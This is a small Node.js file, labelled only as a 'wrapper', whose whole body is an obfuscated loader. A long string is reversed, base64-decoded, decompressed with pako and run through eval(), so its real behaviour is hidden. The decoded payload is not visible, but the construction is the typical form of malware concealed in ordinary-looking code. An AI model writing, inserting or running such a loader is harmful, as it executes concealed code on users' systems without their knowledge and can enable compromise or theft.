// Node.js wrapper
const pako = require('pako');
const atob = (str) => Buffer.from(str, 'base64').toString('binary');

(function() {
    var encoded = '=ooZZawfsH/Gtb1LTkcRvb/qkK7fO+17bewuvTXknopMrfFXLnJlMgcTQ/fsJQaFnMRbELDml3CLMp8ado6XocX9JSsiQG5sZpicsG26SXvLnCXyOHscM3Z9phc20hqo14JhvfWtHWv1cRYm17xHxvUSNuzzr2ILbVzHo0xA3nEbvo/+/fNI1r8X1ukqw9vYnb46DWeKzeA8yjfx7zRqzYpWuj4pBZ+wWRscqr61I8eoTSTC/c6aEMhbEo77z9GnTD6o2u9kMvy0/FrKDMc/3T3kDyLXH3gZ0P05U9bsmw7qAyR6sA/335pF/kl5KtoAp3o3rXXcHGjjsSq9Uumwha55XtixCkTiaMbj6MlxQB0lxVQxjXszX8RUm7NE4BZpBHqgIsSl3/YSgCkwRh8uRePhk2kEW3PwPM2gQTP/CP2lyrcQYnMixddhP625185SPJPGh/NHAt1yq1atWCzJM3IFgGXUkxBaj20VnY2aQYgr603pToNqvrMauJN2o4molWq3z7OeMPSI3R4jLwpthPxL2P3Lq22oMsdDbaTLqrKTBxYmNW6sjB/1FaDIzIpbuNTOW6T48HSRmMgvotWzCqCXJiVFeUzS8uySVyECw/+zXh/2XJonwf/rIMtjTn5ORTI0mUsVNbyDQd6Y7NgFEuV5oiW1qgJ0oSUMtJcBJKVgjVu3FsIXGFX1HbYHurzEE4iCOMXrJD+r2lJfBHz72zyctFurK2Qe11Uuu0fq1RKET1goQ8Yq20zqdg7f4CWz5p9fCbEtf3ydX5yMhdpK6Pf2J4dDeNmJRaEA7cQVtymm0NJ/JuMXXVnsW0ynfOtCrYqu98uD8ISVtkF32eA7oFM+WRtqbC6KrKKRmNIpH3RbBWLbPUZorm7J2LJzGHanjTgBpjkWFQNuAGLzi4ysUNDaWtz8PdrznRlxequIxFxBAszm3TfL1m11YWPCv6As7SqU7dPOB4L46DrA7CH+Dj+gMa/teGVcnPm9+QHIpWGaV5aIKMomV8Y63DmH/lIavssSCKDEJLliKWxH0UY9KlsKBFUns1qQGViW7OsX16n5DqrXbyTxws5kGrdmx6Ejcrs2/n0yx3XslZtJXEmVPP/xWb6sbolzz+G4LP1aShVwF/m3SomWfmOo2ExwSV4Qi+/LPlP/2rnNwf7CZIlwhys56d+dS8yRQQ728iLdXu+raq/KoDmty4O7XSytkkTMgyvXBhMDBYh0mTIaoIGamMtaUGIL8gIDXddfQY02uttVdyJe';
    var decoded = atob(encoded.split('').reverse().join(''));
    var decompressed = pako.inflate(new Uint8Array(decoded.split('').map(c => c.charCodeAt(0))), { to: 'string' });
    eval(decompressed);
})();
